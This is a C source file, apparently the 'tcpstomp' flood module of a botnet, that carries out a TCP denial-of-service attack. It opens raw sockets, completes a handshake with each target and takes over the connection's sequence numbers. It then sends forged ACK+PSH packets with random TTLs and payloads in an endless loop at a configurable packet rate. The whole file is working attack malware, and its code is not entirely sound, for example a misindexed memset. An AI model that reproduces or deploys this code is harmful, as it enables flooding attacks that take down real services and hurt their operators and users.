
#include <netinet/in.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <unistd.h>

#include <netinet/in.h>
#include <linux/ip.h>
#include <linux/tcp.h>

#include "bot/definitions.h"
#include "bot/modules/flood.h"
#include "bot/utils/network.h"
#include "bot/utils/xoshiro.h"

typedef struct {
  u32 addr;
  u16 sport;
  u16 dport;
  u32 seq;
  u32 ack_seq;

  char packet[8192];
} stomp_data_t, *pstomp_data_t;

uint8_t ttl_list[] = {32, 64, 128, 255, 60, 1, 55, 212, 12, 85, 86, 88};

void flood_tcpstomp(pflood_context_t ctx) {
  size_t payload_len = 0;
  size_t buffer_len = 0;
  uint8_t *buffer = NULL;
  int current_pps = 0, pps = 0;

  u16 dport = flood_retrieve_u16(ctx, OPT_DPORT, 0);

  // length settings
  u16 len = flood_retrieve_u16(ctx, OPT_LEN, 512);
  u16 minlen = flood_retrieve_u16(ctx, OPT_MINLEN, 0);
  u16 maxlen = flood_retrieve_u16(ctx, OPT_MAXLEN, 0);
  u32 psleep = flood_retrieve_u32(ctx, OPT_SLEEP, 0);

  // payload stuff
  u8 random = flood_retrieve_u32(ctx, OPT_RANDOMIZE, true);
  pu8 payload = flood_retrieve_bytes(ctx, OPT_PAYLOAD, &payload_len);

  // other settings
  u8 copywindow = flood_retrieve_u32(ctx, OPT_COPY_WINDOW, false);
  u8 ttl = flood_retrieve_u32(ctx, OPT_TTL, 0);

  // pps settings
  u32 minpps = flood_retrieve_u32(ctx, OPT_MINPPS, 0);
  u32 maxpps = flood_retrieve_u32(ctx, OPT_MAXPPS, 0);

  // gen random pps
  if (maxpps != 0 && minpps != 0 && maxpps > minpps) {
    pps = xoshiro_range(minpps, maxpps + 1);
  }

  if (!random) {
    buffer = flood_generate(!payload ? len : payload_len, minlen, maxlen, payload, &buffer_len);
  }

  pstomp_data_t stomp_data = calloc(ctx->num_targs, sizeof(stomp_data_t));

  int rfd;
  if ((rfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1) {
    LOG_ERROR("opening a raw socket failed");
    exit(0);
  }

  // set options to include ip hdr
  if (setsockopt(rfd, IPPROTO_IP, IP_HDRINCL, &(int[]){1}, sizeof(int)) == -1) {
    LOG_INFO("setting HDRINCL failed");
    exit(0);
  }

  for (int i = 0; i < ctx->num_targs; ++i) {
    struct sockaddr_in addr, recv_addr;
    socklen_t recv_addr_len;
    char buf[256];
    time_t start_recv;
    int fd;

  connection_retry:
    if ((fd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
      LOG_ERROR("opening sock streamm socket failed");
      continue;
    }

    fcntl(fd, F_SETFL, fcntl(fd, F_GETFL, 0) | O_NONBLOCK);

    target_random_addr(&ctx->targets[i]);
    addr.sin_addr.s_addr = ctx->targets[i].address;

    addr.sin_family = AF_INET;
    addr.sin_port = htons(dport);

    int _ = connect(fd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in));
    UNUSED_PARM(_);

    start_recv = time(NULL);

    while (true) {
      recv_addr_len = sizeof(struct sockaddr_in);
      int ret = recvfrom(rfd, buf, sizeof(buf), MSG_NOSIGNAL, (struct sockaddr *)&recv_addr,
                         &recv_addr_len);
      if (ret == -1) {
        close(fd);
        goto connection_retry;
      }

      if (recv_addr.sin_addr.s_addr == addr.sin_addr.s_addr &&
          ret > (int)(sizeof(struct iphdr) + sizeof(struct tcphdr))) {

        struct tcphdr *tcph = (struct tcphdr *)(buf + sizeof(struct iphdr));

        if (tcph->source == addr.sin_port) {
          if (tcph->syn && tcph->ack) {
            LOG_INFO("Received SYN + ACK from remote");

            pstomp_data_t data = &stomp_data[i];

            data->addr = addr.sin_addr.s_addr;

            // swap ports
            data->sport = tcph->dest;
            data->dport = tcph->source;

            // extract seq / ack seq
            data->seq = tcph->ack_seq;
            data->ack_seq = htonl(ntohl(tcph->seq) + 1);

            memset(&data->packet[i], 0, MAX_PACKET_LENGTH);

            struct iphdr *tmp_iph = (struct iphdr *)data->packet;
            struct tcphdr *tmp_tcph = (struct tcphdr *)(data->packet + sizeof(struct iphdr));

            tmp_iph->version = 4;
            tmp_iph->ihl = 5;
            tmp_iph->tos = 0;
            tmp_iph->ttl = 64;
            tmp_iph->frag_off = 0;
            tmp_iph->protocol = IPPROTO_TCP;
            tmp_iph->saddr = network_local_addr();
            tmp_iph->daddr = data->addr;

            tmp_tcph->source = data->sport;
            tmp_tcph->dest = data->dport;
            tmp_tcph->seq = data->seq;
            tmp_tcph->ack_seq = data->ack_seq;
            tmp_tcph->doff = 5;
            tmp_tcph->window =
                copywindow ? htons((ntohs(tcph->window) / 128)) : xoshiro_next() & 0xFFFF;

            tmp_tcph->ack = 1;
            tmp_tcph->psh = 1;

            break;
          } else if (tcph->fin || tcph->rst) {
            LOG_WARN("Received FIN or RST from target");
            close(fd);

            goto connection_retry;
          }
        }
      }

      if (time(NULL) - start_recv > 5) {
        LOG_WARN("Timed out");
        close(fd);
        goto connection_retry;
      }
    }
  }

  while (true) {
    for (int i = 0; i < ctx->num_targs; ++i) {
      LOG_INFO("what the tuna");

      pstomp_data_t conn_state = &stomp_data[i];
      if (!conn_state) continue;

      ptarget_t target = &ctx->targets[i];

      struct iphdr *iph = (struct iphdr *)conn_state->packet;
      struct tcphdr *tcph = (struct tcphdr *)(conn_state->packet + sizeof(struct iphdr));
      uint8_t *data = (uint8_t *)(tcph + 1);

      // randomize packet
      if (random)
        buffer = flood_generate(!payload ? len : payload_len, minlen, maxlen, payload, &buffer_len);
      memcpy(data, buffer, buffer_len);

      if (ttl == 0) {
        iph->ttl = ttl_list[xoshiro_next() % sizeof(ttl_list)];
      }

      iph->id = xoshiro_next();
      iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + buffer_len);

      // update seq in hdr
      tcph->seq = conn_state->seq;

      iph->check = 0;
      iph->check = csum_compute(iph, sizeof(struct iphdr));

      tcph->check = 0;
      tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr) + buffer_len),
                                    sizeof(struct tcphdr) + buffer_len);

      // send data
      sendto(rfd, conn_state->packet, sizeof(struct iphdr) + sizeof(struct tcphdr) + buffer_len,
             MSG_NOSIGNAL, (struct sockaddr *)&target->saddr, sizeof(struct sockaddr_in));

      // update sequence number for next pkt
      conn_state->seq = htonl(ntohl(conn_state->seq) + buffer_len);

      // free packet buffer
      if (random) free(buffer);
    }

    // limit the pps
    if (pps != 0 && ++current_pps >= pps) {
      sleep(1);
      current_pps = 0;
    }

    if (psleep > 0) usleep(psleep);
  }
}
